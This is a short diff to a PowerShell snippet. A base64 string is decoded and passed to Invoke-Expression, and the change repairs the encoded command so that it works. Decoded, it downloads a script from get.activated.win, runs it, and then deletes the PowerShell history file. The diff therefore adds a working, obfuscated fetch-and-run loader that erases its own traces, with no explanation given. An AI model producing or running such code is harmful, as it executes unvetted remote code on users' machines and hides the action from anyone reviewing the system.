@@ -1,3 +1,3 @@
-$ec = "aXJtIHwgaHR0cHM6Ly9nZXQuYWN0aXZhdGVkLndpbiB8IGlleDsgcm0gKEdldC1QU1JlYWRMaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGg="
+$ec = "aXJtIGh0dHBzOi8vZ2V0LmFjdGl2YXRlZC53aW4gfCBpZXg7IHJtIChHZXQtUFNSZWFkTGluZU9wdGlvbikuSGlzdG9yeVNhdmVQYXRo"
 $dc = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($ec))
 Invoke-Expression $dc
